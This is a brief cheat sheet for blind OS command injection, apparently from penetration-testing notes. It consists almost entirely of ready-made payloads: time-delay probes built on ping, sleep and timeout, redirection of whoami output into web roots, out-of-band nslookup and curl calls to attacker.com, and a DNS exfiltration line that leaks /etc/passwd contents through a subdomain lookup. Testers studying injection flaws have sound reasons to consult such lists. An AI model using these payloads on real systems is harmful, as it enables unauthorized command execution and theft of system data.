## 🌑 Blind OS Command Injection

### Detect with Time Delay

| OS | Payload |
|----|---------|
| Linux | `; ping -c 10 127.0.0.1` |
| Linux | `; sleep 10` |
| Windows | `& ping -n 10 127.0.0.1` |
| Windows | `& timeout /T 10 /NOBREAK` |

### Extract Output via Redirection
```text
; whoami > /var/www/html/output.txt
; dir > C:\inetpub\wwwroot\output.txt
```

### OAST (Out-of-Band)
```text
; nslookup attacker.com
; curl http://attacker.com
; ping -c 1 attacker.com
```

### Data Exfiltration via DNS
```text
; nslookup whoami.attacker.com
; nslookup $(cat /etc/passwd | head -1).attacker.com
```

